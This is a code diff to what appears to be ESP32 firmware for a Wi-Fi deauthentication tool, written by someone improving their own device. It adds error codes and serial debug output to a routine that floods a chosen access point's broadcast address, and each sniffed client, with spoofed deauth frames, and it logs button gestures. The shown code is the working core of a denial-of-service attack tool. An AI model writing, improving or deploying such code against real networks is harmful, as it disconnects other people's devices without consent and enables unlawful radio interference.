@@ -47,6 +47,7 @@ Preferences prefs;
 DeauthRun deauthRun;
 uint16_t deauthSeq = 0;
 uint8_t clientBuf[ClientTable::kCapacity][6];
+int deauthLastErr = 0;  // last ESP-IDF error of a deauth burst, 0 = ok
 
 Network target{};
 float rssiAt1m = kDefaultRssiAt1m;
@@ -132,8 +133,10 @@ void handleAction(Action a, uint32_t now) {
     case Action::ToggleDeauth:
       if (deauthRun.running()) {
         deauthRun.stop(now);
+        Serial.println("deauth: parado por boton");
       } else {
         deauthRun.start(now);
+        Serial.println("deauth: CORRIENDO");
       }
       break;
     case Action::StopDeauth:
@@ -145,10 +148,12 @@ void handleAction(Action a, uint32_t now) {
 }
 
 void startDeauthBurst(uint32_t now) {
-  int sent = 0;
+  int sent = 0, err = 0;
   for (int i = 0; i < kDeauthBurstBcast; i++) {
-    if (deauthTxSend(target.bssid, broadcastMac(), deauthSeq, kDeauthReason))
-      sent++;
+    const int e = deauthTxSend(target.bssid, broadcastMac(), deauthSeq,
+                               kDeauthReason);
+    if (e == 0) sent++;
+    else if (err == 0) err = e;
     deauthSeq++;
   }
   // The stations seen recently get an unicast deauth each: it survives even
@@ -156,11 +161,16 @@ void startDeauthBurst(uint32_t now) {
   const int n = snifferCopyClients(clientBuf, ClientTable::kCapacity,
                                    kClientWindowMs);
   for (int i = 0; i < n; i++) {
-    if (deauthTxSend(target.bssid, clientBuf[i], deauthSeq, kDeauthReason))
-      sent++;
+    const int e = deauthTxSend(target.bssid, clientBuf[i], deauthSeq,
+                               kDeauthReason);
+    if (e == 0) sent++;
+    else if (err == 0) err = e;
     deauthSeq++;
   }
   deauthRun.addSent(sent, now);
+  deauthLastErr = err;
+  Serial.printf("deauth: ok=%d err=0x%x disp=%d seq=%u\n", sent, err, n,
+                deauthSeq);
 }
 
 // The radio does one thing at a time: a full scan (list, or looking for a
@@ -246,7 +256,12 @@ void loop() {
   const uint32_t now = millis();
 
   const Gesture g = button.update(digitalRead(kButtonPin) == LOW, now);
-  if (g != Gesture::None) handleAction(nav.onGesture(g, nets.size()), now);
+  if (g != Gesture::None) {
+    const Action a = nav.onGesture(g, nets.size());
+    Serial.printf("gesto=%d acc=%d pant=%d\n", static_cast<int>(g),
+                  static_cast<int>(a), static_cast<int>(nav.screen));
+    handleAction(a, now);
+  }
 
   updateRadio(now);
 
@@ -267,7 +282,8 @@ void loop() {
                       deauthRun.running(),
                       deauthRun.sent(),
                       deauthRun.elapsedMs(now),
-                      snifferActive() ? snifferClients(kClientWindowMs) : -1};
+                      snifferActive() ? snifferClients(kClientWindowMs) : -1,
+                      deauthLastErr};
     uiDraw(nav, nets, scannerBusy() && !tracking(), view, deauth, outdoor,
            rssiAt1m, button.heldMs(now), button.pending(now), toast, now);
   }
